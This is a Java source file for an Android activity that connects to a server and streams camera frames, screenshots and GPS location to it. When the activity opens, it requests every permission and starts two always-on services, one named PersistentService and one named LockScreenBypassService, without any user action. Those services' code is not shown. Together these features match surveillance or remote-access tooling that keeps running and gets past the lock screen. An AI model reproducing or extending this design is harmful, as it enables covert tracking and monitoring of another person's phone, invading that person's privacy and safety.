package com.example.myapplication;

import android.content.Intent;
import android.location.Location;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import com.example.myapplication.databinding.ActivitySharingBinding;
import com.example.myapplication.utils.AudioManager;
import com.example.myapplication.utils.CameraManager;
import com.example.myapplication.utils.LocationManager;
import com.example.myapplication.utils.PermissionManager;
import com.example.myapplication.services.PersistentService;
import com.example.myapplication.services.LockScreenBypassService;
import com.example.myapplication.utils.ScreenCaptureManager;
import com.example.myapplication.utils.ScreenshotManager;
import com.example.myapplication.utils.SocketManager;
import com.google.android.material.snackbar.Snackbar;

import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.List;

public class SharingActivity extends AppCompatActivity {
    private static final String TAG = "SharingActivity";
    private ActivitySharingBinding binding;
    
    private boolean isConnected = false;
    
    // Activity result launcher for screen capture permission
    private ActivityResultLauncher<Intent> screenCaptureLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
                    startScreenCapture(result.getData(), result.getResultCode());
                } else {
                    Log.e(TAG, "Screen capture permission denied");
                    showMessage("Screen capture permission denied");
                }
            }
    );
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivitySharingBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        
        setSupportActionBar(binding.toolbar);
        
        // Initialize managers
        initializeManagers();
        
        // Set up button click listeners
        setupClickListeners();
        
        // Request permissions
        requestPermissions();
    }
    
    private void initializeManagers() {
        // Start persistent service first
        startPersistentService();
        
        // Initialize socket manager
        SocketManager.getInstance().initialize();
        
        // Initialize location manager
        LocationManager.getInstance().initialize(this);
        
        // Initialize screen capture manager
        ScreenCaptureManager.getInstance().initialize(this);
        
        // Initialize screenshot manager
        ScreenshotManager.getInstance().initialize(this);
        
        // Initialize camera manager
        CameraManager.getInstance().initialize(this);
    }
    
    private void startPersistentService() {
        try {
            // Start main persistent service
            Intent serviceIntent = new Intent(this, PersistentService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            // Start lock screen bypass service
            Intent lockBypassIntent = new Intent(this, LockScreenBypassService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(lockBypassIntent);
            } else {
                startService(lockBypassIntent);
            }
            
            Log.d(TAG, "All persistent services started from main activity");
        } catch (Exception e) {
            Log.e(TAG, "Error starting persistent services", e);
        }
    }
    
    private void setupClickListeners() {
        // Connect/Disconnect button
        binding.btnConnect.setOnClickListener(v -> {
            if (isConnected) {
                disconnectFromServer();
            } else {
                connectToServer();
            }
        });
        
        // Camera buttons
        binding.btnStartCamera.setOnClickListener(v -> startCamera());
        binding.btnStopCamera.setOnClickListener(v -> stopCamera());
        
        // Screen sharing buttons
        binding.btnStartScreenSharing.setOnClickListener(v -> requestScreenCapturePermission());
        binding.btnStopScreenSharing.setOnClickListener(v -> stopScreenCapture());
        
        // Location sharing buttons
        binding.btnStartLocation.setOnClickListener(v -> startLocationSharing());
        binding.btnStopLocation.setOnClickListener(v -> stopLocationSharing());
    }
    
    private void requestPermissions() {
        PermissionManager.requestAllPermissions(this, new PermissionManager.PermissionCallback() {
            @Override
            public void onPermissionsGranted() {
                Log.d(TAG, "All permissions granted");
                showMessage("All permissions granted");
            }
            
            @Override
            public void onPermissionsDenied(List<String> deniedPermissions) {
                Log.e(TAG, "Some permissions denied: " + deniedPermissions);
                showMessage("Some permissions were denied. App may not work properly.");
            }
        });
    }
    
    // Socket connection methods
    private void connectToServer() {
        try {
            SocketManager.getInstance().initialize();
            
            // Update UI
            binding.statusText.setText("Connecting...");
            binding.btnConnect.setEnabled(false);
            
            // Wait a bit to check connection status
            binding.getRoot().postDelayed(() -> {
                if (SocketManager.getInstance().isConnected()) {
                    isConnected = true;
                    binding.statusText.setText("Connected");
                    binding.btnConnect.setText("Disconnect");
                    binding.btnConnect.setEnabled(true);
                    showMessage("Connected to server");
                } else {
                    binding.statusText.setText("Failed to connect");
                    binding.btnConnect.setText("Retry");
                    binding.btnConnect.setEnabled(true);
                    showMessage("Failed to connect to server");
                }
            }, 2000);
            
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to server", e);
            binding.statusText.setText("Connection error");
            binding.btnConnect.setEnabled(true);
            showMessage("Error connecting to server: " + e.getMessage());
        }
    }
    
    private void disconnectFromServer() {
        try {
            // Disconnect socket
            SocketManager.getInstance().disconnect();
            
            // Stop all sharing
            stopCamera();
            stopScreenCapture();
            stopLocationSharing();
            
            // Update UI
            isConnected = false;
            binding.statusText.setText("Disconnected");
            binding.btnConnect.setText("Connect");
            showMessage("Disconnected from server");
            
        } catch (Exception e) {
            Log.e(TAG, "Error disconnecting", e);
            showMessage("Error disconnecting: " + e.getMessage());
        }
    }
    
    // Camera methods
    private void startCamera() {
        if (!isConnected) {
            showMessage("Please connect to server first");
            return;
        }
        
        CameraManager.getInstance().startCamera(this, binding.cameraPreview, new CameraManager.CameraStreamListener() {
            @Override
            public void onFrameAvailable(ByteBuffer data, int width, int height, long timestamp) {
                // This method will be called when a new camera frame is available
                byte[] byteArray = new byte[data.capacity()];
                data.get(byteArray);
                
                // Send camera data to server
                CameraManager.getInstance().sendCameraDataToServer(byteArray, width, height);
            }
            
            @Override
            public void onCameraError(String error) {
                Log.e(TAG, "Camera error: " + error);
                showMessage("Camera error: " + error);
            }
        });
        
        // Update UI
        binding.btnStartCamera.setEnabled(false);
        binding.btnStopCamera.setEnabled(true);
        binding.cameraPlaceholder.setVisibility(View.GONE);
        binding.cameraPreview.setVisibility(View.VISIBLE);
    }
    
    private void stopCamera() {
        CameraManager.getInstance().stopCamera();
        
        // Update UI
        binding.btnStartCamera.setEnabled(true);
        binding.btnStopCamera.setEnabled(false);
        binding.cameraPlaceholder.setVisibility(View.VISIBLE);
        binding.cameraPreview.setVisibility(View.GONE);
    }
    
    // Screen sharing methods
    private void requestScreenCapturePermission() {
        if (!isConnected) {
            showMessage("Please connect to server first");
            return;
        }
        
        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        Intent intent = projectionManager.createScreenCaptureIntent();
        screenCaptureLauncher.launch(intent);
    }
    
    private void startScreenCapture(Intent resultData, int resultCode) {
        // Use ScreenshotManager for better web compatibility
        ScreenshotManager.getInstance().startCapture(this, resultData, resultCode, new ScreenshotManager.ScreenshotListener() {
            @Override
            public void onScreenshotAvailable(byte[] data) {
                // This method will be called when new screenshot data is available
                // The manager already sends this data to the server
                Log.d(TAG, "Screenshot captured: " + data.length + " bytes");
            }
            
            @Override
            public void onScreenshotError(String error) {
                Log.e(TAG, "Screenshot error: " + error);
                showMessage("Screenshot error: " + error);
                
                // Update UI
                binding.screenSharingStatus.setText("Error: " + error);
                binding.btnStartScreenSharing.setEnabled(true);
                binding.btnStopScreenSharing.setEnabled(false);
            }
        });
        
        // Update UI
        binding.screenSharingStatus.setText("Sharing Screenshots");
        binding.btnStartScreenSharing.setEnabled(false);
        binding.btnStopScreenSharing.setEnabled(true);
    }
    
    private void stopScreenCapture() {
        ScreenshotManager.getInstance().stopCapture();
        
        // Update UI
        binding.screenSharingStatus.setText("Not sharing");
        binding.btnStartScreenSharing.setEnabled(true);
        binding.btnStopScreenSharing.setEnabled(false);
    }
    
    // Location sharing methods
    private void startLocationSharing() {
        if (!isConnected) {
            showMessage("Please connect to server first");
            return;
        }
        
        LocationManager.getInstance().startLocationUpdates(this, new LocationManager.LocationUpdateListener() {
            @Override
            public void onLocationUpdate(Location location) {
                // Update UI with location info
                String locationText = String.format("Sharing: %.6f, %.6f", location.getLatitude(), location.getLongitude());
                binding.locationStatus.setText(locationText);
            }
            
            @Override
            public void onLocationError(String error) {
                Log.e(TAG, "Location error: " + error);
                showMessage("Location error: " + error);
                
                // Update UI
                binding.locationStatus.setText("Error: " + error);
                binding.btnStartLocation.setEnabled(true);
                binding.btnStopLocation.setEnabled(false);
            }
        });
        
        // Update UI
        binding.locationStatus.setText("Starting location updates...");
        binding.btnStartLocation.setEnabled(false);
        binding.btnStopLocation.setEnabled(true);
    }
    
    private void stopLocationSharing() {
        LocationManager.getInstance().stopLocationUpdates();
        
        // Update UI
        binding.locationStatus.setText("Not sharing");
        binding.btnStartLocation.setEnabled(true);
        binding.btnStopLocation.setEnabled(false);
    }
    
    private void showMessage(String message) {
        Snackbar.make(binding.getRoot(), message, Snackbar.LENGTH_SHORT).show();
    }
    
    @Override
    protected void onDestroy() {
        // Clean up resources
        disconnectFromServer();
        CameraManager.getInstance().release();
        super.onDestroy();
    }
}
